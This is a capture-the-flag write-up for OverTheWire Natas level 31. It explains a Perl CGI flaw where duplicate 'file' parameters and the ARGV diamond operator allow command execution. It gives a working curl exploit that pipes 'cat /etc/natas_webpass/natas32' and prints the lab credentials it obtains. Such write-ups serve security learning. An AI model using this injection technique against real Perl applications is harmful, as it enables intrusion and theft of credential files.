# Natas Level 31

> Username: natas31

> Password: aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1z

> URL: http://natas31.natas.labs.overthewire.org

## Solution

Entering the URL, we found `CSV2HTML`. Where we can upload `CSV` file then it change to `HTML`. So let's viewing the source code for more understanding.

```perl
my $cgi = CGI->new;
if ($cgi->upload('file')) {
    my $file = $cgi->param('file');
    print '<table class="sortable table table-hover table-striped">';
    $i=0;
    while (<$file>) {
        my @elements=split /,/, $_;

        if($i==0){ # header
            print "<tr>";
            foreach(@elements){
                print "<th>".$cgi->escapeHTML($_)."</th>";   
            }
            print "</tr>";
        }
        else{ # table content
            print "<tr>";
            foreach(@elements){
                print "<td>".$cgi->escapeHTML($_)."</td>";   
            }
            print "</tr>";
        }
        $i+=1;
    }
    print '</table>';
}
else{
print <<END;
```

The main vulnerability in the code is:

```perl
if ($cgi->upload('file')) {
    my $file = $cgi->param('file');

    while (<$file>) {
```

There are three separate Perl behaviors that combine to create the vulnerability:

1/ `upload('file')`
In list context, CGI's `upload()` can return multiple uploaded filehandles. In this code, it checks whether the `file` parameter contains an upload.

2/ `param('file')`
The `param()` method can return multiple values. However, because `$file` is a scalar, it receives the first parameter value.
So we can make the first value something other than the uploaded file.

3/ `while (<$file>)`
Perl's diamond operator `<>` has special behavior when its filehandle is `ARGV`.
When used with `ARGV`, it reads files specified through Perl's `@ARGV` arguments. It also supports the special pipe syntax used by Perl's implicit `open()` behavior.

So let's exploit this using `curl`.

First we have to create the `CSV` file.

```shll
echo -e "name,value\nJake,123" > test.csv
```

Now sending the malicious request and grep the password.

```shell
curl -u 'natas31:aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1z' -F 'file=ARGV' -F 'file=@test.csv;type=text/csv' 'http://natas31.natas.labs.overthewire.org/index.pl?cat%20/etc/natas_webpass/natas32%20%7C' | grep -oE '[a-zA-Z0-9]{32}'
```

```text
Rc3837d6qd3KoW0R2IgKssMXRX06btgY
```

